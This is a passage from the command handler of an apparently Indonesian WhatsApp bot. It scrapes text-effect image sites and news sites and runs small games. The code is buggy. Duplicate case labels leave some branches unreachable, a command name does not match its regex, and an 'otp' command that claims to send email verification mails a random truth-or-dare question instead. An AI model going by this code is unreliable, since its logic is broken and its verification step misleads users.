            case 'candy': case 'christmas': case '3dchristmas': case 'sparklechristmas': case 'deepsea': case 'scifi': case 'rainbow': case 'waterpipe': case 'spooky': case 'pencil': case 'circuit': case 'discovery': case 'metalic': case 'fiction': case 'demon': case 'transformer': case 'berry': case 'thunder': case 'magma': case '3dstone': case 'neonlight': case 'glitch': case 'harrypotter': case 'brokenglass': case 'papercut': case 'watercolor': case 'multicolor': case 'neondevil': case 'underwater': case 'graffitibike': case 'snow': case 'cloud': case 'honey': case 'ice': case 'fruitjuice': case 'biscuit': case 'wood': case 'chocolate': case 'strawberry': case 'matrix': case 'blood': case 'dropwater': case 'toxic': case 'lava': case 'rock': case 'bloodglas': case 'hallowen': case 'darkgold': case 'joker': case 'wicker': case 'firework': case 'skeleton': case 'blackpink': case 'sand': case 'glue': case '1917': case 'leaves': {
             	if (!text) throw `Example : ${prefix + command} miku`
             	m.reply(mess.wait)
             	let link
             	if (/candy/.test(command)) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'
             	if (/christmas/.test(command)) link = 'https://textpro.me/christmas-tree-text-effect-online-free-1057.html'
             	if (/3dchristmas/.test(command)) link = 'https://textpro.me/3d-christmas-text-effect-by-name-1055.html'
             	if (/sparklechristmas/.test(command)) link = 'https://textpro.me/sparkles-merry-christmas-text-effect-1054.html'
             	if (/deepsea/.test(command)) link = 'https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html'
             	if (/scifi/.test(command)) link = 'https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html'
             	if (/rainbow/.test(command)) link = 'https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html'
             	if (/waterpipe/.test(command)) link = 'https://textpro.me/create-3d-water-pipe-text-effects-online-1048.html'
             	if (/spooky/.test(command)) link = 'https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html'
             	if (/pencil/.test(command)) link = 'https://textpro.me/create-a-sketch-text-effect-online-1044.html'
             	if (/circuit/.test(command)) link = 'https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html'
             	if (/discovery/.test(command)) link = 'https://textpro.me/create-space-text-effects-online-free-1042.html'
             	if (/metalic/.test(command)) link = 'https://textpro.me/creat-glossy-metalic-text-effect-free-online-1040.html'
             	if (/fiction/.test(command)) link = 'https://textpro.me/create-science-fiction-text-effect-online-free-1038.html'
             	if (/demon/.test(command)) link = 'https://textpro.me/create-green-horror-style-text-effect-online-1036.html'
             	if (/transformer/.test(command)) link = 'https://textpro.me/create-a-transformer-text-effect-online-1035.html'
             	if (/berry/.test(command)) link = 'https://textpro.me/create-berry-text-effect-online-free-1033.html'
             	if (/thunder/.test(command)) link = 'https://textpro.me/online-thunder-text-effect-generator-1031.html'
             	if (/magma/.test(command)) link = 'https://textpro.me/create-a-magma-hot-text-effect-online-1030.html'
             	if (/3dstone/.test(command)) link = 'https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html'
             	if (/neonlight/.test(command)) link = 'https://textpro.me/create-3d-neon-light-text-effect-online-1028.html'
             	if (/glitch/.test(command)) link = 'https://textpro.me/create-impressive-glitch-text-effects-online-1027.html'
             	if (/harrypotter/.test(command)) link = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html'
             	if (/brokenglass/.test(command)) link = 'https://textpro.me/broken-glass-text-effect-free-online-1023.html'
             	if (/papercut/.test(command)) link = 'https://textpro.me/create-art-paper-cut-text-effect-online-1022.html'
             	if (/watercolor/.test(command)) link = 'https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html'
             	if (/multicolor/.test(command)) link = 'https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html'
             	if (/neondevil/.test(command)) link = 'https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html'
             	if (/underwater/.test(command)) link = 'https://textpro.me/3d-underwater-text-effect-generator-online-1013.html'
             	if (/graffitibike/.test(command)) link = 'https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html'
             	if (/snow/.test(command)) link = 'https://textpro.me/create-snow-text-effects-for-winter-holidays-1005.html'
             	if (/cloud/.test(command)) link = 'https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html'
             	if (/honey/.test(command)) link = 'https://textpro.me/honey-text-effect-868.html'
             	if (/ice/.test(command)) link = 'https://textpro.me/ice-cold-text-effect-862.html'
             	if (/fruitjuice/.test(command)) link = 'https://textpro.me/fruit-juice-text-effect-861.html'
             	if (/biscuit/.test(command)) link = 'https://textpro.me/biscuit-text-effect-858.html'
             	if (/wood/.test(command)) link = 'https://textpro.me/wood-text-effect-856.html'
             	if (/chocolate/.test(command)) link = 'https://textpro.me/chocolate-cake-text-effect-890.html'
             	if (/strawberry/.test(command)) link = 'https://textpro.me/strawberry-text-effect-online-889.html'
             	if (/matrix/.test(command)) link = 'https://textpro.me/matrix-style-text-effect-online-884.html'
             	if (/blood/.test(command)) link = 'https://textpro.me/horror-blood-text-effect-online-883.html'
             	if (/dropwater/.test(command)) link = 'https://textpro.me/dropwater-text-effect-872.html'
             	if (/toxic/.test(command)) link = 'https://textpro.me/toxic-text-effect-online-901.html'
             	if (/lava/.test(command)) link = 'https://textpro.me/lava-text-effect-online-914.html'
             	if (/rock/.test(command)) link = 'https://textpro.me/rock-text-effect-online-915.html'
             	if (/bloodglas/.test(command)) link = 'https://textpro.me/blood-text-on-the-frosted-glass-941.html'
             	if (/hallowen/.test(command)) link = 'https://textpro.me/halloween-fire-text-effect-940.html'
             	if (/darkgold/.test(command)) link = 'https://textpro.me/metal-dark-gold-text-effect-online-939.html'
             	if (/joker/.test(command)) link = 'https://textpro.me/create-logo-joker-online-934.html'
             	if (/wicker/.test(command)) link = 'https://textpro.me/wicker-text-effect-online-932.html'
             	if (/firework/.test(command)) link = 'https://textpro.me/firework-sparkle-text-effect-930.html'
             	if (/skeleton/.test(command)) link = 'https://textpro.me/skeleton-text-effect-online-929.html'
             	if (/blackpink/.test(command)) link = 'https://textpro.me/create-blackpink-logo-style-online-1001.html'
             	if (/sand/.test(command)) link = 'https://textpro.me/write-in-sand-summer-beach-free-online-991.html'
             	if (/glue/.test(command)) link = 'https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html'
             	if (/1917/.test(command)) link = 'https://textpro.me/1917-style-text-effect-online-980.html'
                if (/leaves/.test(command)) link = 'https://textpro.me/natural-leaves-text-effect-931.html'
             	let anu = await maker.textpro(link, [text])
                miku.sendMessage(m.chat, { image: { url: anu }, caption: 'Textpro Scraper By fy.shizui' }, { quoted: m })
             }
             break
case 'tes':
miku.sendText(`${sender}`, `Tester`, m)
break
case 'otp':
if (checkEmail) return m.reply('sudah ada email')
m.reply(`Email verif telah di kirim silahkan buka mail box anda`)
const trut =['Pernah suka sama siapa aja? berapa lama?','Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)','apa ketakutan terbesar kamu?','pernah suka sama orang dan merasa orang itu suka sama kamu juga?','Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?','pernah gak nyuri uang nyokap atau bokap? Alesanya?','hal yang bikin seneng pas lu lagi sedih apa','pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?','pernah jadi selingkuhan orang?','hal yang paling ditakutin','siapa orang yang paling berpengaruh kepada kehidupanmu','hal membanggakan apa yang kamu dapatkan di tahun ini','siapa orang yang bisa membuatmu sange','siapa orang yang pernah buatmu sange','(bgi yg muslim) pernah ga solat seharian?','Siapa yang paling mendekati tipe pasangan idealmu di sini','suka mabar(main bareng)sama siapa?','pernah nolak orang? alasannya kenapa?','Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget','pencapaian yang udah didapet apa aja ditahun ini?','kebiasaan terburuk lo pas di sekolah apa?']
  const token = trut[Math.floor(Math.random() * trut.length)]
jans = require('./lib/mail.js')
ok = await jans.mail(text, token);
addmail(text);
break
case 'ppuser': {
                    let PhoneNumber = require('awesome-phonenumber')
                    try {
                        ppuser = await miku.profilePictureUrl(who, 'image')
                    } catch {
                        ppuser = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
                    }
                    let about = (await miku.fetchStatus(sender).catch(console.error) || {}).status || ''
                    let str = `
➥  Name : ${pushname}
➥  Link : https://wa.me/${sender.split`@`[0]}
➥  Registered : ${isUser ? 'Yes (' + new Date(gmt) + ')': 'No'}
`.trim()
                    miku.sendMessage(m.chat, { image: { url: ppuser }, caption: str }, { quoted: m })
                }
                break

             //ephoto
             case '3d': case 'window': case 'signature': case 'galaxynimw': case 'avatar': case 'onepiece': case 'boom': case 'anonymous': {// 1 text with radio
			
                    if (args.length == 0) return m.reply(`Example: ${prefix + command} Rival`)
                    m.reply(mess.wait)
					let link
					let radioo
				    if (/anonymous/.test(command)) link = 'https://en.ephoto360.com/create-anonymous-hacker-avatars-cyan-neon-677.html', radioo = ['984dd03e-220d-4335-a6ba-7ac56b092240','71074346-5cb3-4b7d-9b8b-a84e4f142ba4','88bacc38-e755-450a-bbc1-f5671d77c8a7']
					if (/3d/.test(command)) link = 'https://en.ephoto360.com/create-3d-text-effect-on-the-beach-online-688.html', radioo = ['783ab148-70af-40b4-a0e0-6dd837ae6e8b','f0285f0d-a8a7-41c2-b956-a0d372003026','222969f0-a2e0-4909-9629-193e51befbd8','1743f0c3-ce47-4792-a6a8-d65aa24b9021','84a61ecf-125c-450f-8c88-8356e9b35065','f5efa9cb-55ec-4eb9-8705-0b9a9103e5df']
					if (/window/.test(command)) link = 'https://en.ephoto360.com/handwritten-text-on-foggy-glass-online-680.html', radioo = ['2d6f1ad1-39df-4175-9faa-9348b6ba1551','86e55647-2fc7-4b20-ae13-7dfc740af209','22cdd4a3-f144-4f8d-b46f-093b0c1ec0d2','fb6983d2-3bc1-46b5-bb61-00cff1bffbf7','33be5625-d82c-4bd5-97ed-57324fd90a70','50eb6949-e5a5-4feb-95ce-8ca749159ee7']
					if (/signature/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html', radioo = ['7647ec5b-f47c-4dab-91b6-db3afef6c980','aa66248c-328c-447f-8862-ef49e1a73bc0','6bf8fced-bb7f-4373-ad07-5e95fd30e10e','3938db27-c48c-4d96-ab60-f1bd1e312abf','a35d8b0d-bb89-4718-8723-71c5a9e9de4a','188eb364-5a04-446e-a779-0e2f427b7bc3']
					if (/galaxynime/.test(command)) link = 'https://en.ephoto360.com/create-a-beautiful-galaxy-cover-lol-344.html', radioo = ['0333f7bc-b275-43da-ab34-b6bd550bc9f7','adc92b8e-1bc7-46b1-9f24-69054a5b59d3','7a951e7b-7881-4abe-ad1d-b1d4a81fc67a','577522b2-7047-448c-8306-7f441cb744d4','a074b12c-409a-428f-8349-2f02eac01587','1a65b9cc-cd6b-4730-b763-0d9196e35725']
					if (/avatar/.test(command)) link = 'https://en.ephoto360.com/free-logo-intro-video-maker-online-558.html', radioo = ['a4f1f582-9cf1-4826-8d6f-f82682935696','70bf3a9e-45b4-40e5-8551-8d968cec0f9f','e2d9795e-f612-4eb8-b6eb-9efa73f4ede1','dc745ea0-e01d-4c69-97c0-6b066d5741d5','2747f827-2ff8-42af-8d56-e40aac303c9e']
					if (/onepiece/.test(command)) link = 'https://en.ephoto360.com/create-one-piece-facebook-cover-online-553.html', radioo = ['cd754453-c633-426f-b74f-1ad234d68c73','4aca8b82-95fc-4f76-aec4-3dfd35f8643d','6616f94c-c11b-46d7-acf5-591f85058fd6','d0f94685-22c2-4b98-99bd-feb137bcda62','7f88a9d5-289b-449d-a111-82f3b4bd4546','54bba753-cddc-4639-8e73-e9c02a653e17','1e67a77b-fcd2-4539-a036-0a6a65a806d2','value="94e59201-debe-43ce-b2fd-bdd2d1eec6de','1afe8173-5bd8-4714-bba0-7a428caa4f83','fefa0a48-add6-4b05-b7e0-e02154fe4ed0','b1bc2ec1-a814-4047-97e5-fd54546c139f','6087dba4-4494-4b8c-98fb-e9ded5ecb004','bf1e9072-3c40-49aa-8fa2-02b3cc2a59ef','ffe89d47-f34d-4d20-b5a2-ac17e015f78f','eed28fbf-3895-46cb-8c52-960a78c14860','454cff9d-4736-465a-a823-0c7d0dbee2f2','e77083fb-8f62-4619-b9ae-7435ca71e467','0fa46b0b-02f8-4802-a0aa-206d54022f10']
					if (/boom/.test(command)) link = 'https://en.ephoto360.com/boom-text-comic-style-text-effect-675.html', radioo = ['f36541e4-27fa-440c-8314-3b3c1b6feddc','3d8588cf-d870-4840-b633-5d5be31ce07c','bdf06259-64f0-49bb-9d30-7f824622bb7a','1bb11477-d977-4d44-a7b9-e23495cd6358','acf1aaf7-19f5-45c3-addd-75d760e65cc2','c6154cc4-270a-4f52-a4cf-6cff63d549ae']
					radio = radioo[Math.floor(Math.random() * radioo.length)]
					anu = await maker.ephoto4(link, [q], radio)
             miku.sendMessage(m.chat, { image: { url: 'https://e1.yotools.net'+`${anu.image}` }, caption: 'Ephoto Scraper By fy.shizui' }, { quoted: m })
            }
            break
				case 'mascot': case 'glitter': { // 2 text with radio
				
                    if (args.length == 0) return m.reply(`Example: ${prefix + command} Miku|bot`) 
                    m.reply(mess.wait)
					let link
					let radioo
				    if (/mascot/.test(command)) link = 'https://en.ephoto360.com/create-logo-avatar-mascot-style-364.html', radioo = ['f26629d6-5b3d-4702-beba-542a2d9f7439','9a9ccc88-62b3-4209-86c1-19798c8e9760','2b86e5cb-9254-4078-baeb-6fdc1b76632a','6d88da4a-acd4-4fe6-9d23-7ca4803ade26','09feee25-257e-4e85-b4c6-70e3cc62d9a6','1f926df3-b06e-44fa-9d9b-63cceb638ba1','5a0c8152-cade-453e-94d3-f69bf29796d4','2f7d1db5-3ff3-4c96-95eb-d5d849aa1b43','62023478-a77d-42dd-8238-e9cad3945a6f','2d9ad953-64a0-4b8f-86f3-8a0501b08510','1d075d9f-15d8-4300-95d1-56f02b532f41','77f5b478-d7df-4443-94dc-c8be71ee1049','22e895fe-288d-4d30-b63e-c1eb0de09271','b0242aa8-adaa-4367-a660-8ed466bd6670','829e5eab-721f-42a0-8d08-f75c83411f54','bgkscskmt','gu3nvozkw','s5uvb3ngt','51jlkc2ug','zvwk9kkc8','zm9etfup0','zknqqnnd1','h2hkigv6i','m6zosmq4g']
					if (/glitter/.test(command)) link = 'https://en.ephoto360.com/free-glitter-text-effect-maker-online-656.html', radioo = ['9a0f8a8a-d4b0-42bf-945f-06e75a2ac6a4','bf5c590b-27c0-4f12-986c-f2758674d97b','450adc52-33aa-4519-b921-9c814ae0f275','1ad3c6ed-ba1e-4582-95cf-b5e2d7d1a125','83d9bd14-0ebe-470b-a2c7-bdda4f37ef17','155f67da-bf57-42e4-a3a8-5f1825b65b7e']
					radio = radioo[Math.floor(Math.random() * radioo.length)]
					anu = await maker.ephoto4(link, [q.split('|')[0], q.split('|')[1]], radio)
					miku.sendMessage(m.chat, { image: { url: 'https://e1.yotools.net'+`${anu.image}` }, caption: 'Textpro Scraper By fy.shizui' }, { quoted: m })
				}
				break
				case 'valorant': { // 3 text with radio
                    if (args.length == 0) return m.reply(`Example: ${prefix + command} chika|bot|Rival`)
                    m.reply(mess.wait)
					let link
					let radioo
				    if (/valorant/.test(command)) link = 'https://en.ephoto360.com/create-valorant-banner-youtube-online-588.html', radioo = ['072dd1a0-db7d-4b87-b3e7-b142c2e8cad6','784a10c2-660e-4955-901a-a1b57881df42','00251bca-e044-42bd-8dd7-f536ac0c42b4','882898c0-054d-4dce-b08a-823af1f4cfc7','4f51675f-4ad4-42a4-ad1e-1eb8792dfad6','90d9209e-0739-4079-81f7-959fd12f3bbe','dbd319cf-a529-4958-b43e-7f2e19f05853','71b52833-5560-46b4-ac88-92054c6d1f5a','acc7c093-9937-4a3d-85da-d66c02c92751','48ab2129-3543-4fa9-9361-2868fab8f073']
					radio = radioo[Math.floor(Math.random() * radioo.length)]
					anu = await maker.ephoto4(link, [q.split('|')[0], q.split('|')[1], q.split('|')[2]], radio)
					miku.sendMessage(m.chat, { image: { url: 'https://e1.yotools.net'+`${anu.image}` }, caption: 'Textpro Scraper By fy.shizui' }, { quoted: m })
				}
				break
				case 'sand': case 'whitesand': case 'goldbanner': case 'goldsand': case 'neon': case 'glassrain': case 'hallowen': case 'hallowen3': case 'underwater': case 'cutegravity': case 'papercolor': case 'cloud': case 'snow': case 'birthday': { // 1 text no radio
				
                    if (args.length == 0) return m.reply(`Example: ${prefix + command} Rival`) 
                    m.reply(mess.wait)
					let link
				    if (/neon/.test(command)) link = 'https://en.ephoto360.com/neon-devil-wings-text-effect-online-683.html'
					if (/glassrain/.test(command)) link = 'https://en.ephoto360.com/foggy-rainy-text-effect-75.html'
					if (/hallowen/.test(command)) link = 'https://en.ephoto360.com/halloween-fire-text-online-83.html'
					if (/hallowen2/.test(command)) link = 'https://en.ephoto360.com/halloween-fire-text-effect-online-369.html'
					if (/underwater/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
					if (/cutegravity/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
					if (/papercolor/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
					if (/watercolor/.test(command)) link = 'https://en.ephoto360.com/graffiti-color-199.html'
					if (/cloud/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
					if (/snow/.test(command)) link = 'https://en.ephoto360.com/create-a-snow-3d-text-effect-free-online-621.html'
					if (/birthday/.test(command)) link = 'https://en.ephoto360.com/colorful-birthday-foil-balloon-text-effects-620.html'
					if (/goldsand/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
					if (/goldbanner/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
					if (/whitesand/.test(command)) link = 'https://en.ephoto360.com/create-a-summery-sand-writing-text-effect-577.html'
					if (/sand/.test(command)) link = 'https://en.ephoto360.com/realistic-3d-sand-text-effect-online-580.html'
					anu = await maker.ephoto3(link, [q])
					miku.sendMessage(m.chat, { image: { url: 'https://e1.yotools.net'+`${anu.image}` }, caption: 'Textpro Scraper By fy.shizui' }, { quoted: m })
				}
				break
				case 'gravity': case 'wallgravity': case 'tipografi': case 'light': case 'pornhub': { // 2 text no radio
				
                    if (args.length == 0) return m.reply(`Example: ${prefix + command} Miku|bot`) 
                    m.reply(mess.wait)
					let link
				    if (/gravity/.test(command)) link = 'https://en.ephoto360.com/cute-girl-painting-graffiti-text-effect-667.html'
					if (/wallgravity/.test(command)) link = 'https://en.ephoto360.com/create-a-graffiti-text-effect-on-the-wall-online-665.html'
					if (/tipografi/.test(command)) link = 'https://en.ephoto360.com/create-typography-status-quotes-images-online-for-free-452.html'
					if (/light/.test(command)) link = 'https://en.ephoto360.com/create-realistic-vintage-3d-light-bulb-608.html'
					if (/pornhub/.test(command)) link = 'https://en.ephoto360.com/create-pornhub-style-logos-online-free-549.html'
					anu = await maker.ephoto3(link, [q.split("|")[0], q.split("|")[1]])
					miku.sendMessage(m.chat, { image: { url: 'https://e1.yotools.net'+`${anu.image}` }, caption: 'Ephoto Scraper By fy.shizui' }, { quoted: m })
				}
				break
case 'lirik': { 
if (!q) return m.reply('Judul') 
            let song = await hxz.lirik(q)
miku.sendMessage(m.chat, { text: {url: song.lirik }},  {quoted: m})
}
break
case 'shadow':
if (!text) throw `Example : ${prefix + command} miku`
m.reply(mess.wait)
anu = await xfarr.maker.photooxy('https://photooxy.com/logo-and-text-effects/shadow-text-effect-in-the-sky-394.html', `${text}`)
					miku.sendImage(m.chat, anu.result, 'Scraper Photooxy', m)
					break
case 'coffe':
if (!text) throw `Example : ${prefix + command} chika`
m.reply(mess.wait)
anu = await xfarr.maker.photooxy('https://photooxy.com/logo-and-text-effects/put-any-text-in-to-coffee-cup-371.html', `${text}`)
					miku.sendImage(m.chat, anu.result, 'Scraper Photooxy', m)
					break

case 'butterfly':
if (!text) throw `Example : ${prefix + command} chika`
m.reply(mess.wait)
anu = await xfarr.maker.photooxy('https://photooxy.com/logo-and-text-effects/butterfly-text-with-reflection-effect-183.html', `${text}`)
					miku.sendImage(m.chat, anu.result, 'Scraper Photooxy', m)
					break

case 'scary':
if (!text) throw `Example : ${prefix + command} chika`
m.reply(mess.wait)
anu = await xfarr.maker.photooxy('https://photooxy.com/logo-and-text-effects/text-on-scary-cemetery-gate-172.html', `${text}`)
					miku.sendImage(m.chat, anu.result, 'Scraper Photooxy', m)
					break

case 'burn':
if (!text) throw `Example : ${prefix + command} chika`
m.reply(mess.wait)
anu = await xfarr.maker.photooxy('https://photooxy.com/logo-and-text-effects/write-text-on-burn-paper-388.html', `${text}`)
					miku.sendImage(m.chat, anu.result, 'Scraper Photooxy', m)
					break

case 'frosty':
				 photofunia = require('./lib/photofunia.js')
					if (!text) throw `Example : ${prefix + command} chika`
             	m.reply(mess.wait)
                    
                    anu = await photofunia.use(`${text}`,'https://m.photofunia.com/effects/frosty-window-writing')
					miku.sendImage(m.chat, anu, 'Scraper Photofunia', m)
					break
case 'plane':
				 photofunia = require('./lib/photofunia.js')
					if (!text) throw `Example : ${prefix + command} chika`
             	m.reply(mess.wait)
                    
                    anu = await photofunia.use(`${text}`,'https://m.photofunia.com/effects/plane-banner')
					miku.sendImage(m.chat, anu, 'Scraper Photofunia', m)
					break
case 'typewriter':
				 photofunia = require('./lib/photofunia.js')
					if (!text) throw `Example : ${prefix + command} chika`
             	m.reply(mess.wait)
                    
                    anu = await photofunia.use(`${text}`,'https://m.photofunia.com/effects/typewriter')
					miku.sendImage(m.chat, anu, 'Scraper Photofunia', m)
					break
				case 'ballon':
				 photofunia = require('./lib/photofunia.js')
					if (!text) throw `Example : ${prefix + command} chika`
             	m.reply(mess.wait)
                    
                    anu = await photofunia.use(`${text}`,'https://m.photofunia.com/categories/all_effects/balloon')
					miku.sendImage(m.chat, anu, 'Scraper Photofunia', m)
					break

case 'einstein':
				 photofunia = require('./lib/photofunia.js')
					if (!text) throw `Example : ${prefix + command} miku`
             	m.reply(mess.wait)
                    
                    anu = await photofunia.use(`${text}`,'https://m.photofunia.com/categories/all_effects/einstein')
					miku.sendImage(m.chat, anu, 'Scraper Photofunia', m)
					break
					case 'pantaii':
				 photofunia = require('./lib/photofunia.js')
					if (!text) throw `Example : ${prefix + command} miku`
             	m.reply(mess.wait)
                    
                    anu = await photofunia.use(`${text}`,'https://m.photofunia.com/categories/all_effects/beach-sign')
					miku.sendImage(m.chat, anu, 'Scraper Photofunia', m)
					break
					case 'passir':
				 photofunia = require('./lib/photofunia.js')
					if (!text) throw `Example : ${prefix + command} miku`
             	m.reply(mess.wait)
                    
                    anu = await photofunia.use(`${text}`,'https://m.photofunia.com/categories/all_effects/sand_writing')
					miku.sendImage(m.chat, anu, 'Scraper Photofunia', m)
					break
            case 'susunkata': {
                if (susunkata.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/susunkata.json')
                let result = anu[Math.floor(Math.random() * anu.length)]
                miku.sendText(m.chat, `*Jawablah Pertanyaan Berikut :*\nSoal : ${result.soal}\nTipe : ${result.tipe}\nWaktu : 60s`, m).then(() => {
                    susunkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                })
                await sleep(60000)
                if (susunkata.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    m.reply(`Waktu Habis\nJawaban : ${result.jawaban}`)
                    delete susunkata[m.sender.split('@')[0]]
                }
            }
            break
case 'fajarnews':
FajarNews().then(async(res) => {
console.log(res) 
no = 0
teks = ".•♫•♬.•♫••♬•♫•.•♬•♫•.•♫•♬.•♫••♬•♫•.•♬•♫•."
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ".•♫•♬.•♫••♬•♫•.•♬•♫•.•♫•♬.•♫••♬•♫•.•♬•♫•."
reply(teks) 
})

break
case "quotes":
var res = await Quotes()
teks = ".•♫•♬.•♫••♬•♫•.•♬•♫•.•♫•♬.•♫••♬•♫•.•♬•♫•."
teks += `\nAuthor: ${res.author}\n`
teks += `\nQuotes:\n`
teks += `${res.quotes}\n`
teks += ".•♫•♬.•♫••♬•♫•.•♬•♫•.•♫•♬.•♫••♬•♫•.•♬•♫•."
reply(teks)

break
case "darkjoke":
var res = await Darkjokes()
teks = "\nDarkjokes*"
miku.sendMessage(m.chat, { image : { url : res }, caption: teks }, { quoted : m })

break
case 'cnnnews':
CNNNews().then(res => {
no = 0
teks = ".•♫•♬.•♫••♬•♫•.•♬•♫•.•♫•♬.•♫••♬•♫•.•♬•♫•."
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ".•♫•♬.•♫••♬•♫•.•♬•♫•.•♫•♬.•♫••♬•♫•.•♬•♫•."
reply(teks) 
})

break
case 'layarkaca':
if (!q) return m.reply('Judul') 
LayarKaca21(q).then(async(res) => {
no = 0
teks = ".•♫•♬.•♫••♬•♫•.•♬•♫•.•♫•♬.•♫••♬•♫•.•♬•♫•."
for (let i of res) {
  no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Film: ${i.film_title}\n`
teks += `Link: ${i.film_link}\n`
}
teks += `.•♫•♬.•♫••♬•♫•.•♬•♫•.•♫•♬.•♫••♬•♫•.•♬•♫•.`
reply(teks) 
})

break
case 'cnbcnews':
CNBCNews().then(async(res) => {
no = 0
teks = ".•♫•♬.•♫••♬•♫•.•♬•♫•.•♫•♬.•♫••♬•♫•.•♬•♫•."
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ".•♫•♬.•♫••♬•♫•.•♬•♫•.•♫•♬.•♫••♬•♫•.•♬•♫•."
miku.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : m })

})

break
case 'tribunnews':
TribunNews().then(async(res) => {
no = 0
teks = ".•♫•♬.•♫••♬•♫•.•♬•♫•.•♫•♬.•♫••♬•♫•.•♬•♫•."
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ".•♫•♬.•♫••♬•♫•.•♬•♫•.•♫•♬.•♫••♬•♫•.•♬•♫•."
miku.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : m })
})

break
case 'indozone':
IndozoneNews().then(async(res) => {
no = 0
teks = ".•♫•♬.•♫••♬•♫•.•♬•♫•.•♫•♬.•♫••♬•♫•.•♬•♫•."
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ".•♫•♬.•♫••♬•♫•.•♬•♫•.•♫•♬.•♫••♬•♫•.•♬•♫•."
miku.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : m })
})

break

case 'detiknews':
DetikNews().then(async(res) => {

no = 0
teks = ".•♫•♬.•♫••♬•♫•.•♬•♫•.•♫•♬.•♫••♬•♫•.•♬•♫•."
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ".•♫•♬.•♫••♬•♫•.•♬•♫•.•♫•♬.•♫••♬•♫•.•♬•♫•."
miku.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : m })

})

break
case 'dailynews':
DailyNews().then(async(res) => {

no = 0
teks = ".•♫•♬.•♫••♬•♫•.•♬•♫•.•♫•♬.•♫••♬•♫•.•♬•♫•."
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ".•♫•♬.•♫••♬•♫•.•♬•♫•.•♫•♬.•♫••♬•♫•.•♬•♫•."
miku.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : m })

})

break


case 'okezone':
OkezoneNews().then(async(res) => {

no = 0
teks = ".•♫•♬.•♫••♬•♫•.•♬•♫•.•♫•♬.•♫••♬•♫•.•♬•♫•."
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ".•♫•♬.•♫••♬•♫•.•♬•♫•.•♫•♬.•♫••♬•♫•.•♬•♫•."
miku.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : m })

})

break

case 'sindonews':
SindoNews().then(async(res) => {

no = 0
teks = ".•♫•♬.•♫••♬•♫•.•♬•♫•.•♫•♬.•♫••♬•♫•.•♬•♫•."
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
